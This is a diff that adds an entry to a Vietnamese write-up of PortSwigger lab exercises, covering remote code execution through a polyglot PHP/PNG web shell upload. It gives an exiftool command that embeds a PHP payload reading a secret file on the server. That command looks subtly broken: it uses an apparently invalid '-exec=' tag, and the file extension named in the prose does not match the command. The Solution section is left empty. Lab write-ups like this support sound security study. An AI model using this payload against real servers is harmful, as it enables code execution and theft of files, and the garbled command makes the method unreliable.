@@ -250,3 +250,20 @@ Solution:
   <li>Với payload GET:</li>
   <ul><li>Nhấn send thu được:<br><image src="./images/resultCau11.png"></li></ul>
 </ul>
+
+
+Câu 12: <a href="https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload">Remote code execution via polyglot web shell upload</a>
+
+Problem: 
+<ul>
+  <li>Qua thử nghiệm có thể thấy server loại các file có nội dung không phải của png, vậy nên bắt buộc phải tạo tệp PHP/PNG, là 1 tệp đa ngôn ngữ, về cơ bản nó cũng chỉ là 1 hình ảnh bình thường.</li>
+  <li>Một cách đơn giản để làm điều này là tải xuống và chạy ExifTool từ dòng lệnh như sau: ```exiftool -exec="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <-YOUR-INPUT-IMAGE->.jpg -o polyglot.php```</li>
+  <li>Đoạn mã trên sẽ thêm code PHP vào trường của hình ảnh, sau đó lưu hình ảnh với một phần mở rộng exec.php </li>
+</ul>
+
+Solution:
+
+<ul>
+  <li></li>
+</ul>
+
